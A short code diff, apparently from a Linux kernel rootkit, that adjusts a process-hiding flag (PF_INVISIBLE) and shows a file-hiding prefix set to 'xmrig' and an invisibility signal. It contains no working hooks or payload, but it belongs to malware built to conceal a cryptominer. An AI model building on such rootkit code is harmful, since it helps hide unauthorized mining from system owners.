@@ -6,7 +6,7 @@ struct linux_dirent {
 };
 
 #define MAGIC_PREFIX "xmrig"
-#define PF_INVISIBLE 0x100000000
+#define PF_INVISIBLE 0x10000000
 
 enum {
 	SIGINVIS = 31,
